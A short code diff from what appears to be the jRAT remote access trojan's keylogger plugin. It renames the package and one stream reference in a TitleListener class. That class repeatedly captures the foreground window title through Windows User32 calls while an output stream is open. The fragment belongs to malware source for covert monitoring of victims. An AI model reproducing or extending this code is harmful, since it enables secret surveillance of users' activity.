@@ -1,7 +1,7 @@
-package pro.jrat.plugin.stub;
+package pro.jrat.plugin.keylogger.stub;
 
-import pro.jrat.plugin.stub.activities.Activities;
-import pro.jrat.plugin.stub.activities.Title;
+import pro.jrat.plugin.keylogger.stub.activities.Activities;
+import pro.jrat.plugin.keylogger.stub.activities.Title;
 
 import com.sun.jna.Native;
 import com.sun.jna.Pointer;
@@ -19,7 +19,7 @@ public class TitleListener implements Runnable {
 		try {
 			Thread.sleep(1000L);
 			while (true) {
-				if (KeyloggerPlugin.dos != null) {
+				if (StubPlugin.dos != null) {
 					User32DLL.GetWindowTextW(User32DLL.GetForegroundWindow(), BUFFER, MAX_TITLE_LENGTH);
 					String title = Native.toString(BUFFER);
 					
